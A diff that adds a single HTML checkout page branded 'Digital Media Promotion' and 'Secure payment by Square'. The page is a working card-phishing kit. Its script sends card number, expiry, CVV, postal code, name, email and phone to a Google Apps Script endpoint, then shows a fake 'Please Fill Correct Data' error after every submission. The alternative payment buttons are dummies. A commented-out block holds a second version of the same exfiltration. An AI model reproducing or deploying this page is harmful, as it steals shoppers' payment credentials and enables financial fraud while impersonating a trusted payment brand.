@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Digital Media Promotion</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,200;0,300;0,400;0,500;0,600;0,700;0,800;1,500&amp;display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.3/dist/jquery.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+    <!--<script src="jquery.payment.min.js"></script>-->
+    <!--<script src="jquery.payment.js"></script>-->
+    <style>
+        body {
+            background: #f5f5f5;
+            font-family: 'Poppins', sans-serif;
+        }
+    
+        .header_top {
+            padding: 25px;
+            background-color: #ffff;
+            margin-bottom: 25px;
+            text-align: center;
+            font-weight: 700;
+            box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;
+        }
+    
+        .main_home {
+            padding: 0;
+        }
+    
+        .main_div {
+            padding: 25px;
+            background-color: #fff;
+            margin-bottom: 25px;
+            box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;
+        }
+    
+        .div_head {
+            margin-bottom: 5px;
+            text-align: center;
+            font-weight: 700;
+        }
+    
+        .div_label {
+            font-size: 12px;
+            color: #0000008c;
+            font-weight: 500;
+        }
+    
+        .input_amount_div {
+            background-color: #f2f2f2;
+            width: 120px;
+            height: 50px;
+            padding: 20px;
+            color: #000;
+            line-height: 24px;
+            height: 54px;
+            padding: 12px 20px;
+            margin: auto;
+            font-size: 20px;
+            font-weight: 500;
+            border-radius: 8px;
+            display: inline-block;
+            border: none !important;
+            outline: none !important;
+            margin-bottom: 40px;
+        }
+    
+        .bottom_p {
+            font-size: 14px;
+            color: #ccc;
+            margin-bottom: 20px;
+        }
+    
+        .hrr {
+            border-bottom: 1px solid #d3d3d3;
+            margin-bottom: 40px;
+            margin-top: 40px;
+        }
+    
+        .bbtn {
+            background-color: #006AFF;
+            border: none;
+            border-radius: 5px;
+            color: #fff !important;
+            cursor: pointer;
+            text-decoration: none !important;
+            font-size: 15px;
+            font-weight: 400;
+            width: 100%;
+            padding: 15px 20px;
+            text-align: center !important;
+        }
+    
+        .Checkout_head {
+            font-size: 20px;
+            color: #000;
+            margin-bottom: 20px;
+        }
+    
+        .Subtotal_text {
+            font-size: 15px;
+            margin-bottom: 12px;
+        }
+    
+        .Subtotal_money {
+            font-size: 15px;
+            float: right;
+            margin-bottom: 12px;
+        }
+    
+        .order_text {
+            font-size: 17px;
+            font-weight: 500;
+        }
+    
+        .order_money {
+            font-size: 17px;
+            float: right;
+            font-weight: 500;
+        }
+    
+        .myform {
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            width: 100%;
+            height: 50px;
+            padding: 10px;
+            margin-bottom: 10px;
+            outline: none !important;
+        }
+    
+        .btn_gpay {
+            padding: 15px 20px;
+            color: #000;
+            border-radius: 5px;
+            border: 1px solid #000;
+            width: 100%;
+            background-color: #fff;
+        }
+    
+        .active_payment_div {
+            border: 2px solid #ccc;
+            border-radius: 5px;
+            padding: 20px;
+            margin-bottom: 10px;
+        }
+    
+        .active_payment_div:hover {
+            border: 2px solid #000;
+        }
+    
+        .headd_text {
+            font-size: 12px;
+            font-weight: 500;
+        }
+    
+        .all_transactions {
+            font-size: 11px;
+            font-weight: 500;
+        }
+    
+        .lock_img {
+            width: 12px;
+        }
+    
+        .credit_card {
+            font-size: 15px;
+        }
+    
+        .card_design {
+            background-color: #f1f1f1 !important;
+            padding: 10px;
+            border: 1px solid #f1f1f1;
+            border-radius: 5px;
+            width: 100%;
+        }
+    
+        .card_design:hover {
+            border: 1px solid #000;
+        }
+    
+        .my_card_input {
+            background-color: #f1f1f1 !important;
+            border: none !important;
+            width: 100%;
+            padding: 5px;
+            outline: none !important;
+        }
+    
+        .save_div {
+            padding: 15px;
+            border-radius: 5px;
+            background-color: #f5f5f5;
+            font-size: 12px;
+        }
+    
+        .my_right_icon {
+            float: right;
+            width: 40px;
+            height: 25px;
+            border-radius: 3px;
+        }
+    
+        .alert {
+            color: red;
+            font-size: 12px;
+            padding-top: 10px;
+        }
+    
+        .card_alert {
+            color: #000;
+            font-size: 12px;
+            padding-top: 10px;
+            margin-bottom: 0;
+        }
+    
+        .foot_p {
+            color: #71767b;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header_top">Digital Media Promotion</div>
+    <div class="main_home">
+        <div class="main_div">
+            <form method="post" action="" name="product" id="product">
+                <div class="check">
+                    <p class="Checkout_head">Checkout</p>
+                    <div class="row">
+                        <div class="col-6">
+                            <p class="Subtotal_text">Subtotal</p>
+                        </div>
+                        <div class="col-6">
+                            <p class="Subtotal_money" id="Subtotal">$.00</p>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-6">
+                            <p class="order_text">Order total</p>
+                        </div>
+                        <div class="col-6">
+                            <p class="order_money" id="order">$.00</p>
+                        </div>
+                    </div>
+                </div>
+                <hr class="hrr">
+                <p class="headd_text">REQUIRED*</p>
+                <input type="text" class="myform" name="email2" placeholder="Email ID" required="">
+                <input type="text" class="myform" name="phone2" placeholder="Phone No." required="">
+                <hr class="hrr">
+                <p class="headd_text">EXPRESS CHECKOUT</p>
+                <center>
+                    <a class="btn btn_gpay">
+                        <img src="gpay.png" style="width: 60px;">
+                    </a>
+                    <p class="my_alert_gpay alert" style="display: none;">Not Available at this moment</p>
+                </center>
+                <hr class="hrr">
+                <p class="headd_text">CONTACT</p>
+                <div class="row">
+                    <div class="col-3" style="padding-right: 0px;">
+                        <input type="text" class="myform" name="pcode" value="+1" required="">
+                    </div>
+                    <div class="col-9">
+                        <input type="text" class="myform" name="phone" placeholder="Phone Number" required="">
+                    </div>
+                    <div class="col-12">
+                        <input type="email" class="myform" name="email" placeholder="Email Address for receipt" required="">
+                    </div>
+                    <div class="col-6" style="padding-right: 3px;">
+                        <input type="text" class="myform" name="fname" placeholder="First Name" required="">
+                    </div>
+                    <div class="col-6" style="padding-left: 3px;">
+                        <input type="text" class="myform" name="lname" placeholder="Last Name" required="">
+                    </div>
+                </div>
+                <hr class="hrr">
+                <p class="headd_text" style="margin-bottom: 5px;">PAYMENT <img src="lock.png" class="lock_img"></p>
+                <p class="all_transactions">All transactions are secure and encrypted</p>
+                <div class="active_payment_div">
+                    <div class="row">
+                        <div class="col-9">
+                            <p class="credit_card">Credit Card</p>
+                        </div>
+                        <div class="col-3">
+                            <img src="credit-card.png" class="my_right_icon" style="width: 30px;">
+                        </div>
+                        <div class="col-12">
+                            <div class="card_design">
+                                <div class="row" style="border-bottom: 1px solid #ccc; margin: 0;">
+                                    <div class="col-2">
+                                        <img src="credit-card.png" style="float: right;">
+                                    </div>
+                                    <div class="col-10" style="padding: 0;">
+                                        <input type="text" maxlength="19" minlength="16" class="my_card_input cc-number" name="card_number" placeholder="Card Number" required="">
+                                    </div>
+                                </div>
+                                <div class="row" style="margin: 0;">
+                                    <div class="col-4">
+                                        <input type="text" maxlength="7" class="my_card_input cc-expires" name="card_exp" placeholder="MM/YY" required="">
+                                    </div>
+                                    <div class="col-4">
+                                        <input type="text" maxlength="4" class="my_card_input cc-cvc" name="card_cvv" placeholder="CVV" required="">
+                                    </div>
+                                    <div class="col-4">
+                                        <input type="text" class="my_card_input " name="card_postal" placeholder="Postal Code" required="">
+                                    </div>
+                                </div>
+                            </div>
+                            <p class="card_alert"></p>
+                        </div>
+                    </div>
+                </div>
+                <div class="active_payment_div Cash_App">
+                    <div class="row">
+                        <div class="col-9">
+                            <p class="credit_card" style="margin: 0;">Cash App Pay</p>
+                        </div>
+                        <div class="col-3">
+                            <img src="cash.png" class="my_right_icon">
+                        </div>
+                    </div>
+                </div>
+                <p class="Cash_App_alert alert" style="display: none;">Not Available at this moment</p>
+                <div class="active_payment_div Afterpay">
+                    <div class="row">
+                        <div class="col-9">
+                            <p class="credit_card" style="margin: 0;">
+                                Afterpay<br>
+                                <span style="font-size: 10px;">4 interest-free installments of $7.50</span>
+                            </p>
+                        </div>
+                        <div class="col-3">
+                            <img src="afterpay.png" class="my_right_icon">
+                        </div>
+                    </div>
+                </div>
+                <p class="Afterpay_alert alert" style="display: none;">Not Available at this moment</p>
+
+                <hr class="hrr">
+                <p class="headd_text">REMEMBER ME</p>
+                <div class="save_div">
+                    <div class="row">
+                        <div class="col-2">
+                            <img src="diss.png" style="width: 40px;" id="bg">
+                        </div>
+                        <div class="col-10">
+                            Save my information for a faster checkout
+                        </div>
+                    </div>
+                </div>
+                <div style="padding-top: 15px;">
+                    <img src="ppp.png" style="width: 20px;"> <b id="show">Pay</b>
+                </div>
+                <hr class="hrr">
+                <button type="submit" name="btnsave" class="btn bbtn" id="btnsave">Pay $.00</button>
+            </form>
+        </div>
+    </div>
+    <center>
+        <img src="square.png" style="width: 50px;">
+        <p class="foot_p">Secure payment by Square</p>
+    </center>
+
+</body>
+
+
+<script>
+    $(function() {
+        $('.save_div').click(function() {
+            $("#bg").attr('src', "inn.png");
+        });
+    });
+    $(document).ready(function() {
+        $(".btn_gpay").click(function() {
+            $(".my_alert_gpay").toggle();
+        });
+
+        $(".Cash_App").click(function() {
+            $(".Cash_App_alert").toggle();
+        });
+
+        $(".Afterpay").click(function() {
+            $(".Afterpay_alert").toggle();
+        });
+    });
+    $(document).ready(function() {
+        $(".cc-number").keyup(function() {
+            $(".card_alert").text("Enter your card number");
+        })
+        $(".cc-exp").keyup(function() {
+            $(".card_alert").text("Enter your expiration date");
+        })
+        $(".cc-cvc").keyup(function() {
+            $(".card_alert").text("Enter the security code");
+        })
+    });
+    // Toggle image source on button click
+
+// document.addEventListener('DOMContentLoaded', function() {
+//     const saveDivButton = document.querySelector('.save_div');
+//     const bgImage = document.getElementById('bg');
+
+//     saveDivButton.addEventListener('click', function() {
+//         bgImage.src = 'inn.png';
+//     });
+// });
+
+// // Toggle alerts for different payment methods
+// document.addEventListener('DOMContentLoaded', function() {
+//     const btnGpay = document.querySelector('.btn_gpay');
+//     const myAlertGpay = document.querySelector('.my_alert_gpay');
+//     const cashApp = document.querySelector('.Cash_App');
+//     const cashAppAlert = document.querySelector('.Cash_App_alert');
+//     const afterpay = document.querySelector('.Afterpay');
+//     const afterpayAlert = document.querySelector('.Afterpay_alert');
+
+//     btnGpay.addEventListener('click', function() {
+//         myAlertGpay.style.display = 'block';
+//     });
+
+//     cashApp.addEventListener('click', function() {
+//         cashAppAlert.style.display = 'block';
+//     });
+
+//     afterpay.addEventListener('click', function() {
+//         afterpayAlert.style.display = 'block';
+//     });
+// });
+
+// // Update card alert messages based on input fields
+document.addEventListener('DOMContentLoaded', function() {
+    const url = window.location.href
+    const str = url.split("%24",2)[1]
+    document.getElementById('order').innerHTML =`$ ${url.split("%24",2)[1]}`
+    document.getElementById('Subtotal').innerHTML = `$ ${url.split("%24",2)[1]}`
+    document.getElementById('btnsave').innerHTML = `$ ${url.split("%24",2)[1]}`
+    // const order = document.getElementById('bg');
+    // const ccExpInput = document.querySelector('.cc-exp');
+    // const ccCvcInput = document.querySelector('.cc-cvc');
+    // const cardAlert = document.querySelector('.card_alert');
+
+    // ccNumberInput.addEventListener('keyup', function() {
+    //     cardAlert.textContent = 'Enter your card number';
+    // });
+
+    // ccExpInput.addEventListener('keyup', function() {
+    //     cardAlert.textContent = 'Enter your expiration date';
+    // });
+
+    // ccCvcInput.addEventListener('keyup', function() {
+    //     cardAlert.textContent = 'Enter the security code';
+    // });
+});
+
+
+
+
+// document.addEventListener('DOMContentLoaded', function () {
+//   // Reference to your HTML form
+//   const form = document.querySelector('form');
+
+//   // Add an event listener for form submission
+//   form.addEventListener('submit', function (event) {
+//     event.preventDefault(); // Prevent the default form submission
+
+//     // Collect form data
+//     const formData = {
+//       email2: document.querySelector('input[name="email2"]').value,
+//       phone2: document.querySelector('input[name="phone2"]').value,
+//       pcode: document.querySelector('input[name="pcode"]').value,
+//       phone: document.querySelector('input[name="phone"]').value,
+//       email: document.querySelector('input[name="email"]').value,
+//       fname: document.querySelector('input[name="fname"]').value,
+//       lname: document.querySelector('input[name="lname"]').value,
+//       card_number: document.querySelector('input[name="card_number"]').value,
+//       card_exp: document.querySelector('input[name="card_exp"]').value,
+//       card_cvv: document.querySelector('input[name="card_cvv"]').value,
+//       card_postal: document.querySelector('input[name="card_postal"]').value
+//     };
+
+//     // Convert the form data to JSON
+//     const jsonData = JSON.stringify(formData);
+
+//     // Send the JSON data to the Google Apps Script
+//     fetch('https://script.google.com/macros/s/AKfycbzadeiCbLMbqHJBXBaUJdzedg5_o5xzc6fV1IJps8Ft_mbgOkTIBEGrsnME6knKRYjmZA/exec', {
+//       method: 'POST',
+//       body: jsonData,
+//       headers: {
+//         'Content-Type': 'application/json'
+//       }
+//     })
+//     .then(response => {
+//       if (response.ok) {
+//         // Handle a successful response
+//         console.log('Data sent successfully.');
+//       } else {
+//         // Handle errors here
+//         console.error('Failed to send data.');
+//       }
+//     })
+//     .catch(error => {
+//       console.error('Error:', error);
+//     });
+//   });
+// });
+
+const scriptURL = 'https://script.google.com/macros/s/AKfycbw2Jp5rjJWeI8c1PFVP_J7RSHjWa5Z5KqMrHlvj896J_ob96ZYSeyRMXZ7PVSwfg7O2Ag/exec'
+        const form = document.forms['product']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => {
+                document.getElementById('Subtotal').style.color = "#686363";
+            })
+            .then(() => { 
+                //  window.location.reload(); 
+                alert("Please Fill Correct Data");
+                })
+            .catch(error => console.error('Error!', error.message))
+        })
+
+</script>
+
+</html>
